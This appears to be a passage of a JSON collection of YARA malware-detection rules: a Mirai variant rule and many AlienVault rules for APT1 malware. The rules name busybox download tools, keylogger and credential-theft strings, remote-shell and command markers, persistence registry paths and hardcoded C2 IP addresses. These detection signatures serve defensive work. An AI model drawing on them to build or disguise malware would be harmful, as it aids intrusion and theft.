{
  "is__elf": "rule is__elf {\n\tmeta:\n\t\tauthor = \"@mmorenog,@yararules\"\n\tstrings:\n\t\t$header = { 7F 45 4C 46 }\n\tcondition:\n\t\t$header at 0\n}",
  "is__Mirai_gen7": "rule is__Mirai_gen7 {\n        meta:\n                description = \"Generic detection for MiraiX version 7\"\n                reference = \"http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html\"\n                author = \"unixfreaxjp\"\n                org = \"MalwareMustDie\"\n                date = \"2018-01-05\"\n\n        strings:\n                $st01 = \"/bin/busybox rm\" fullword nocase wide ascii\n                $st02 = \"/bin/busybox echo\" fullword nocase wide ascii\n                $st03 = \"/bin/busybox wget\" fullword nocase wide ascii\n                $st04 = \"/bin/busybox tftp\" fullword nocase wide ascii\n                $st05 = \"/bin/busybox cp\" fullword nocase wide ascii\n                $st06 = \"/bin/busybox chmod\" fullword nocase wide ascii\n                $st07 = \"/bin/busybox cat\" fullword nocase wide ascii\n\n        condition:\n                5 of them\n}",
  "LIGHTDART_APT1": "rule LIGHTDART_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"ret.log\" wide ascii\n        $s2 = \"Microsoft Internet Explorer 6.0\" wide ascii\n        $s3 = \"szURL Fail\" wide ascii\n        $s4 = \"szURL Successfully\" wide ascii\n        $s5 = \"%s&sdate=%04ld-%02ld-%02ld\" wide ascii\n\n    condition:\n        all of them\n}",
  "AURIGA_APT1": "rule AURIGA_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"superhard corp.\" wide ascii\n        $s2 = \"microsoft corp.\" wide ascii\n        $s3 = \"[Insert]\" wide ascii\n        $s4 = \"[Delete]\" wide ascii\n        $s5 = \"[End]\" wide ascii\n        $s6 = \"!(*@)(!@KEY\" wide ascii\n        $s7 = \"!(*@)(!@SID=\" wide ascii\n\n    condition:\n        all of them\n}",
  "AURIGA_driver_APT1": "rule AURIGA_driver_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Services\\\\riodrv32\" wide ascii\n        $s2 = \"riodrv32.sys\" wide ascii\n        $s3 = \"svchost.exe\" wide ascii\n        $s4 = \"wuauserv.dll\" wide ascii\n        $s5 = \"arp.exe\" wide ascii\n        $pdb = \"projects\\\\auriga\" wide ascii\n\n    condition:\n        all of ($s*) or $pdb\n}",
  "BANGAT_APT1": "rule BANGAT_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"superhard corp.\" wide ascii\n        $s2 = \"microsoft corp.\" wide ascii\n        $s3 = \"[Insert]\" wide ascii\n        $s4 = \"[Delete]\" wide ascii\n        $s5 = \"[End]\" wide ascii\n        $s6 = \"!(*@)(!@KEY\" wide ascii\n        $s7 = \"!(*@)(!@SID=\" wide ascii\n        $s8 = \"end      binary output\" wide ascii\n        $s9 = \"XriteProcessMemory\" wide ascii\n        $s10 = \"IE:Password-Protected sites\" wide ascii\n        $s11 = \"pstorec.dll\" wide ascii\n\n    condition:\n        all of them\n}",
  "BISCUIT_GREENCAT_APT1": "rule BISCUIT_GREENCAT_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"zxdosml\" wide ascii\n        $s2 = \"get user name error!\" wide ascii\n        $s3 = \"get computer name error!\" wide ascii\n        $s4 = \"----client system info----\" wide ascii\n        $s5 = \"stfile\" wide ascii\n        $s6 = \"cmd success!\" wide ascii\n\n    condition:\n        all of them\n}",
  "BOUNCER_APT1": "rule BOUNCER_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"*Qd9kdgba33*%Wkda0Qd3kvn$*&><(*&%$E#%$#1234asdgKNAg@!gy565dtfbasdg\" wide ascii\n        $s2 = \"IDR_DATA%d\" wide ascii\n        $s3 = \"asdfqwe123cxz\" wide ascii\n        $s4 = \"Mode must be 0(encrypt) or 1(decrypt).\" wide ascii\n\n    condition:\n        ($s1 and $s2) or ($s3 and $s4)\n}",
  "BOUNCER_DLL_APT1": "rule BOUNCER_DLL_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"new_connection_to_bounce():\" wide ascii\n        $s2 = \"usage:%s IP port [proxip] [port] [key]\" wide ascii\n\n    condition:\n        all of them\n}",
  "CALENDAR_APT1": "rule CALENDAR_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n       \n    strings:\n        $s1 = \"content\" wide ascii\n        $s2 = \"title\" wide ascii\n        $s3 = \"entry\" wide ascii\n        $s4 = \"feed\" wide ascii\n        $s5 = \"DownRun success\" wide ascii\n        $s6 = \"%s@gmail.com\" wide ascii\n        $s7 = \"<!--%s-->\" wide ascii\n        $b8 = \"W4qKihsb+So=\" wide ascii\n        $b9 = \"PoqKigY7ggH+VcnqnTcmhFCo9w==\" wide ascii\n        $b10 = \"8oqKiqb5880/uJLzAsY=\" wide ascii\n\n    condition:\n        all of ($s*) or all of ($b*)\n}",
  "COMBOS_APT1": "rule COMBOS_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Mozilla4.0 (compatible; MSIE 7.0; Win32)\" wide ascii\n        $s2 = \"Mozilla5.1 (compatible; MSIE 8.0; Win32)\" wide ascii\n        $s3 = \"Delay\" wide ascii\n        $s4 = \"Getfile\" wide ascii\n        $s5 = \"Putfile\" wide ascii\n        $s6 = \"---[ Virtual Shell]---\" wide ascii\n        $s7 = \"Not Comming From Our Server %s.\" wide ascii\n\n    condition:\n        all of them\n}",
  "DAIRY_APT1": "rule DAIRY_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 7.0;)\" wide ascii\n        $s2 = \"KilFail\" wide ascii\n        $s3 = \"KilSucc\" wide ascii\n        $s4 = \"pkkill\" wide ascii\n        $s5 = \"pklist\" wide ascii\n\n    condition:\n        all of them\n}",
  "GLOOXMAIL_APT1": "rule GLOOXMAIL_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Kill process success!\" wide ascii\n        $s2 = \"Kill process failed!\" wide ascii\n        $s3 = \"Sleep success!\" wide ascii\n        $s4 = \"based on gloox\" wide ascii\n        $pdb = \"glooxtest.pdb\" wide ascii\n\n    condition:\n        all of ($s*) or $pdb\n}",
  "GOGGLES_APT1": "rule GOGGLES_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Kill process success!\" wide ascii\n        $s2 = \"Kill process failed!\" wide ascii\n        $s3 = \"Sleep success!\" wide ascii\n        $s4 = \"based on gloox\" wide ascii\n        $pdb = \"glooxtest.pdb\" wide ascii\n\n    condition:\n        all of ($s*) or $pdb\n}",
  "HACKSFASE1_APT1": "rule HACKSFASE1_APT1\n{\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = {cb 39 82 49 42 be 1f 3a}\n\n    condition:\n        all of them\n}",
  "HACKSFASE2_APT1": "rule HACKSFASE2_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Send to Server failed.\" wide ascii\n        $s2 = \"HandShake with the server failed. Error:\" wide ascii\n        $s3 = \"Decryption Failed. Context Expired.\" wide ascii\n\n    condition:\n        all of them\n}",
  "KURTON_APT1": "rule KURTON_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Mozilla/4.0 (compatible; MSIE8.0; Windows NT 5.1)\" wide ascii\n        $s2 = \"!(*@)(!@PORT!(*@)(!@URL\" wide ascii\n        $s3 = \"MyTmpFile.Dat\" wide ascii\n        $s4 = \"SvcHost.DLL.log\" wide ascii\n\n    condition:\n        all of them\n}",
  "LONGRUN_APT1": "rule LONGRUN_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Mozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0; Trident/4.0)\" wide ascii\n        $s2 = \"%s\\\\%c%c%c%c%c%c%c\" wide ascii\n        $s3 = \"wait:\" wide ascii\n        $s4 = \"Dcryption Error! Invalid Character\" wide ascii\n\n    condition:\n        all of them\n}",
  "MACROMAIL_APT1": "rule MACROMAIL_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"svcMsn.dll\" wide ascii\n        $s2 = \"RundllInstall\" wide ascii\n        $s3 = \"Config service %s ok.\" wide ascii\n        $s4 = \"svchost.exe\" wide ascii\n\n    condition:\n        all of them\n}",
  "MANITSME_APT1": "rule MANITSME_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Install an Service hosted by SVCHOST.\" wide ascii\n        $s2 = \"The Dll file that to be released.\" wide ascii\n        $s3 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" wide ascii\n        $s4 = \"svchost.exe\" wide ascii\n        $e1 = \"Man,it's me\" wide ascii\n        $e2 = \"Oh,shit\" wide ascii\n        $e3 = \"Hallelujah\" wide ascii\n        $e4 = \"nRet == SOCKET_ERROR\" wide ascii\n        $pdb1 = \"rouji\\\\release\\\\Install.pdb\" wide ascii\n        $pdb2 = \"rouji\\\\SvcMain.pdb\" wide ascii\n\n    condition:\n        (all of ($s*)) or (all of ($e*)) or $pdb1 or $pdb2\n}",
  "MINIASP_APT1": "rule MINIASP_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"miniasp\" wide ascii\n        $s2 = \"wakeup=\" wide ascii\n        $s3 = \"download ok!\" wide ascii\n        $s4 = \"command is null!\" wide ascii\n        $s5 = \"device_input.asp?device_t=\" wide ascii\n\n    condition:\n        all of them\n}",
  "NEWSREELS_APT1": "rule NEWSREELS_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"Mozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0)\" wide ascii\n        $s2 = \"name=%s&userid=%04d&other=%c%s\" wide ascii\n        $s3 = \"download ok!\" wide ascii\n        $s4 = \"command is null!\" wide ascii\n        $s5 = \"noclient\" wide ascii\n        $s6 = \"wait\" wide ascii\n        $s7 = \"active\" wide ascii\n        $s8 = \"hello\" wide ascii\n\n    condition:\n        all of them\n}",
  "SEASALT_APT1": "rule SEASALT_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n      \n    strings:\n        $s1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 5.00; Windows 98) KSMM\" wide ascii\n        $s2 = \"upfileok\" wide ascii\n        $s3 = \"download ok!\" wide ascii\n        $s4 = \"upfileer\" wide ascii\n        $s5 = \"fxftest\" wide ascii\n\n    condition:\n        all of them\n}",
  "STARSYPOUND_APT1": "rule STARSYPOUND_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"*(SY)# cmd\" wide ascii\n        $s2 = \"send = %d\" wide ascii\n        $s3 = \"cmd.exe\" wide ascii\n        $s4 = \"*(SY)#\" wide ascii\n\n    condition:\n        all of them\n}",
  "SWORD_APT1": "rule SWORD_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n       \n    strings:\n        $s1 = \"@***@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>>>\" wide ascii\n        $s2 = \"sleep:\" wide ascii\n        $s3 = \"down:\" wide ascii\n        $s4 = \"*========== Bye Bye ! ==========*\" wide ascii\n\n    condition:\n        all of them\n}",
  "thequickbrow_APT1": "rule thequickbrow_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"thequickbrownfxjmpsvalzydg\" wide ascii\n\n    condition:\n        all of them\n}",
  "TABMSGSQL_APT1": "rule TABMSGSQL_APT1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"letusgohtppmmv2.0.0.1\" wide ascii\n        $s2 = \"Mozilla/4.0 (compatible; )\" wide ascii\n        $s3 = \"filestoc\" wide ascii\n        $s4 = \"filectos\" wide ascii\n        $s5 = \"reshell\" wide ascii\n\n    condition:\n        all of them\n}",
  "CCREWBACK1": "rule CCREWBACK1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"postvalue\" wide ascii\n        $b = \"postdata\" wide ascii\n        $c = \"postfile\" wide ascii\n        $d = \"hostname\" wide ascii\n        $e = \"clientkey\" wide ascii\n        $f = \"start Cmd Failure!\" wide ascii\n        $g = \"sleep:\" wide ascii\n        $h = \"downloadcopy:\" wide ascii\n        $i = \"download:\" wide ascii\n        $j = \"geturl:\" wide ascii\n        $k = \"1.234.1.68\" wide ascii\n\n    condition:\n        4 of ($a,$b,$c,$d,$e) or $f or 3 of ($g,$h,$i,$j) or $k\n}",
  "TrojanCookies_CCREW": "rule TrojanCookies_CCREW\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n     strings:\n        $a = \"sleep:\" wide ascii\n        $b = \"content=\" wide ascii\n        $c = \"reqpath=\" wide ascii\n        $d = \"savepath=\" wide ascii\n        $e = \"command=\" wide ascii\n\n    condition:\n        4 of ($a,$b,$c,$d,$e)\n}",
  "GEN_CCREW1": "rule GEN_CCREW1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"W!r@o#n$g\" wide ascii\n        $b = \"KerNel32.dll\" wide ascii\n\n    condition:\n        any of them\n}",
  "Elise": "rule Elise\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n       \n    strings:\n        $a = \"SetElise.pdb\" wide ascii\n\n    condition:\n        $a\n}",
  "EclipseSunCloudRAT": "rule EclipseSunCloudRAT\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"Eclipse_A\" wide ascii\n        $b = \"\\\\PJTS\\\\\" wide ascii\n        $c = \"Eclipse_Client_B.pdb\" wide ascii\n        $d = \"XiaoME\" wide ascii\n        $e = \"SunCloud-Code\" wide ascii\n        $f = \"/uc_server/data/forum.asp\" wide ascii\n\n    condition:\n        any of them\n}",
  "MoonProject": "rule MoonProject\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n       \n    strings:\n        $a = \"Serverfile is smaller than Clientfile\" wide ascii\n        $b = \"\\\\M tools\\\\\" wide ascii\n        $c = \"MoonDLL\" wide ascii\n        $d = \"\\\\M tools\\\\\" wide ascii\n\n  condition:\n        any of them\n}",
  "ccrewDownloader1": "rule ccrewDownloader1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = {DD B5 61 F0 20 47 20 57 D6 65 9C CB 31 1B 65 42}\n\n    condition:\n        any of them\n}",
  "ccrewDownloader2": "rule ccrewDownloader2\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"3gZFQOBtY3sifNOl\" wide ascii\n        $b = \"docbWUWsc2gRMv9HN7TFnvnKcrWUUFdAEem9DkqRALoD\" wide ascii\n        $c = \"6QVSOZHQPCMc2A8HXdsfuNZcmUnIqWrOIjrjwOeagILnnScxadKEr1H2MZNwSnaJ\" wide ascii\n\n    condition:\n        any of them\n}",
  "ccrewMiniasp": "rule ccrewMiniasp\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n\n  strings:\n        $a = \"MiniAsp.pdb\" wide ascii\n        $b = \"device_t=\" wide ascii\n\n  condition:\n        any of them\n}",
  "ccrewSSLBack2": "rule ccrewSSLBack2\n{\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = {39 82 49 42 BE 1F 3A}\n\n    condition:\n        any of them\n}",
  "ccrewSSLBack3": "rule ccrewSSLBack3\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"SLYHKAAY\" wide ascii\n\n  condition:\n        any of them\n}",
  "ccrewSSLBack1": "rule ccrewSSLBack1\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"!@#%$^#@!\" wide ascii\n        $b = \"64.91.80.6\" wide ascii\n\n  condition:\n        any of them\n}",
  "ccrewDownloader3": "rule ccrewDownloader3\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"ejlcmbv\" wide ascii\n        $b = \"bhxjuisv\" wide ascii\n        $c = \"yqzgrh\" wide ascii\n        $d = \"uqusofrp\" wide ascii\n        $e = \"Ljpltmivvdcbb\" wide ascii\n        $f = \"frfogjviirr\" wide ascii\n        $g = \"ximhttoskop\" wide ascii\n\n    condition:\n        4 of them\n}",
  "ccrewQAZ": "rule ccrewQAZ\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"!QAZ@WSX\" wide ascii\n\n  condition:\n        $a\n}",
  "metaxcd": "rule metaxcd\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"<meta xcd=\" wide ascii\n\n    condition:\n        $a\n}",
  "MiniASP": "rule MiniASP\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $KEY = { 71 30 6E 63 39 77 38 65 64 61 6F 69 75 6B 32 6D 7A 72 66 79 33 78 74 31 70 35 6C 73 36 37 67 34 62 76 68 6A }\n        $PDB = \"MiniAsp.pdb\" nocase wide ascii\n\n    condition:\n        any of them\n}",
  "DownloaderPossibleCCrew": "rule DownloaderPossibleCCrew\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $a = \"%s?%.6u\" wide ascii\n        $b = \"szFileUrl=%s\" wide ascii\n        $c = \"status=%u\" wide ascii\n        $d = \"down file success\" wide ascii\n        $e = \"Mozilla/4.0 (compatible; MSIE 6.0; Win32)\" wide ascii\n\n  condition:\n        all of them\n}",
  "APT1_MAPIGET": "rule APT1_MAPIGET\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $s1 = \"%s\\\\Attachment.dat\" wide ascii\n        $s2 = \"MyOutlook\" wide ascii\n        $s3 = \"mail.txt\" wide ascii\n        $s4 = \"Recv Time:\" wide ascii\n        $s5 = \"Subject:\" wide ascii\n\n    condition:\n       all of them\n}",
  "APT1_LIGHTBOLT": "rule APT1_LIGHTBOLT\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $str1 = \"bits.exe\" wide ascii\n        $str2 = \"PDFBROW\" wide ascii\n        $str3 = \"Browser.exe\" wide ascii\n        $str4 = \"Protect!\" wide ascii\n\n    condition:\n        2 of them\n}",
  "APT1_GETMAIL": "rule APT1_GETMAIL\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $stra1 = \"pls give the FULL path\" wide ascii\n        $stra2 = \"mapi32.dll\" wide ascii\n        $stra3 = \"doCompress\" wide ascii\n        $strb1 = \"getmail.dll\" wide ascii\n        $strb2 = \"doCompress\" wide ascii\n        $strb3 = \"love\" wide ascii\n\n    condition:\n        all of ($stra*) or all of ($strb*)\n}",
  "APT1_GDOCUPLOAD": "rule APT1_GDOCUPLOAD\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $str1 = \"name=\\\"GALX\\\"\" wide ascii\n        $str2 = \"User-Agent: Shockwave Flash\" wide ascii\n        $str3 = \"add cookie failed...\" wide ascii\n        $str4 = \",speed=%f\" wide ascii\n\n    condition:\n        3 of them\n}",
  "APT1_WEBC2_Y21K": "rule APT1_WEBC2_Y21K\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"Y29ubmVjdA\" wide ascii // connect\n        $2 = \"c2xlZXA\" wide ascii // sleep\n        $3 = \"cXVpdA\" wide ascii // quit\n        $4 = \"Y21k\" wide ascii // cmd\n        $5 = \"dW5zdXBwb3J0\" wide ascii // unsupport\n\n    condition:\n        4 of them\n}",
  "APT1_WEBC2_YAHOO": "rule APT1_WEBC2_YAHOO\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $http1 = \"HTTP/1.0\" wide ascii\n        $http2 = \"Content-Type:\" wide ascii\n        $uagent = \"IPHONE8.5(host:%s,ip:%s)\" wide ascii\n\n    condition:\n        all of them\n}",
  "APT1_WEBC2_UGX": "rule APT1_WEBC2_UGX\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $persis = \"SOFTWARE\\\\MICROSOFT\\\\WINDOWS\\\\CURRENTVERSION\\\\RUN\" wide ascii\n        $exe = \"DefWatch.exe\" wide ascii\n        $html = \"index1.html\" wide ascii\n        $cmd1 = \"!@#tiuq#@!\" wide ascii\n        $cmd2 = \"!@#dmc#@!\" wide ascii\n        $cmd3 = \"!@#troppusnu#@!\" wide ascii\n\n    condition:\n        3 of them\n}",
  "APT1_WEBC2_TOCK": "rule APT1_WEBC2_TOCK\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"InprocServer32\" wide ascii\n        $2 = \"HKEY_PERFORMANCE_DATA\" wide ascii\n        $3 = \"<!---[<if IE 5>]id=\" wide ascii\n\n    condition:\n        all of them\n}",
  "APT1_WEBC2_TABLE": "rule APT1_WEBC2_TABLE\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $msg1 = \"Fail To Execute The Command\" wide ascii\n        $msg2 = \"Execute The Command Successfully\" wide ascii\n        /*\n    \t$gif1 = /\\w+\\.gif/\n    \t*/\n        $gif2 = \"GIF89\" wide ascii\n\n    condition:\n        3 of them\n}",
  "APT1_WEBC2_RAVE": "rule APT1_WEBC2_RAVE\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"iniet.exe\" wide ascii\n        $2 = \"cmd.exe\" wide ascii\n        $3 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\DEVFS\" wide ascii\n        $4 = \"Device File System\" wide ascii\n\n    condition:\n        3 of them\n}",
  "APT1_WEBC2_QBP": "rule APT1_WEBC2_QBP\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"2010QBP\" wide ascii\n        $2 = \"adobe_sl.exe\" wide ascii\n        $3 = \"URLDownloadToCacheFile\" wide ascii\n        $4 = \"dnsapi.dll\" wide ascii\n        $5 = \"urlmon.dll\" wide ascii\n\n    condition:\n        4 of them\n}",
  "APT1_WEBC2_HEAD": "rule APT1_WEBC2_HEAD\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"Ready!\" wide ascii\n        $2 = \"connect ok\" wide ascii\n        $3 = \"WinHTTP 1.0\" wide ascii\n        $4 = \"<head>\" wide ascii\n\n    condition:\n        all of them\n}",
  "APT1_WEBC2_GREENCAT": "rule APT1_WEBC2_GREENCAT\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"reader_sl.exe\" wide ascii\n        $2 = \"MS80547.bat\" wide ascii\n        $3 = \"ADR32\" wide ascii\n        $4 = \"ControlService failed!\" wide ascii\n\n    condition:\n        3 of them\n}",
  "APT1_WEBC2_DIV": "rule APT1_WEBC2_DIV\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"3DC76854-C328-43D7-9E07-24BF894F8EF5\" wide ascii\n        $2 = \"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" wide ascii\n        $3 = \"Hello from MFC!\" wide ascii\n        $4 = \"Microsoft Internet Explorer\" wide ascii\n\n    condition:\n        3 of them\n}",
  "APT1_WEBC2_CSON": "rule APT1_WEBC2_CSON\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $httpa1 = \"/Default.aspx?INDEX=\" wide ascii\n        $httpa2 = \"/Default.aspx?ID=\" wide ascii\n        $httpb1 = \"Win32\" wide ascii\n        $httpb2 = \"Accept: text*/*\" wide ascii\n        $exe1 = \"xcmd.exe\" wide ascii\n        $exe2 = \"Google.exe\" wide ascii\n\n    condition:\n        1 of ($exe*) and 1 of ($httpa*) and all of ($httpb*)\n}",
  "APT1_WEBC2_CLOVER": "rule APT1_WEBC2_CLOVER\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $msg1 = \"BUILD ERROR!\" wide ascii\n        $msg2 = \"SUCCESS!\" wide ascii\n        $msg3 = \"wild scan\" wide ascii\n        $msg4 = \"Code too clever\" wide ascii\n        $msg5 = \"insufficient lookahead\" wide ascii\n        $ua1 = \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)\" wide ascii\n        $ua2 = \"Mozilla/5.0 (Windows; Windows NT 5.1; en-US; rv:1.8.0.12) Firefox/1.5.0.12\" wide ascii\n\n    condition:\n        2 of ($msg*) and 1 of ($ua*)\n}",
  "APT1_WEBC2_BOLID": "rule APT1_WEBC2_BOLID\n{\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n      \n    strings:\n        $vm = \"VMProtect\" wide ascii\n        $http = \"http://[c2_location]/[page].html\" wide ascii\n\n    condition:\n        all of them\n}",
  "APT1_WEBC2_ADSPACE": "rule APT1_WEBC2_ADSPACE\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"<!---HEADER ADSPACE style=\" wide ascii\n        $2 = \"ERSVC.DLL\" wide ascii\n\n    condition:\n        all of them\n}",
  "APT1_WEBC2_AUSOV": "rule APT1_WEBC2_AUSOV\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"ntshrui.dll\" wide ascii\n        $2 = \"%SystemRoot%\\\\System32\\\\\" wide ascii\n        $3 = \"<!--DOCHTML\" wide ascii\n        $4 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\" wide ascii\n        $5 = \"Ausov\" wide ascii\n\n    condition:\n        4 of them\n}",
  "APT1_WARP": "rule APT1_WARP\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $err1 = \"exception...\" wide ascii\n        $err2 = \"failed...\" wide ascii\n        $err3 = \"opened...\" wide ascii\n        $exe1 = \"cmd.exe\" wide ascii\n        $exe2 = \"ISUN32.EXE\" wide ascii\n\n    condition:\n        2 of ($err*) and all of ($exe*)\n}",
  "APT1_TARSIP_ECLIPSE": "rule APT1_TARSIP_ECLIPSE\n{\n\n    meta:\n        author = \"AlienVault Labs\"\n        info = \"CommentCrew-threat-apt1\"\n        \n    strings:\n        $1 = \"\\\\pipe\\\\ssnp\" wide ascii\n        $2 = \"toobu.ini\" wide ascii\n        $3 = \"Serverfile is not bigger than Clientfile\" wide ascii\n        $4 = \"URL download success\" wide ascii\n\n    condition:\n        3 of them\n}",
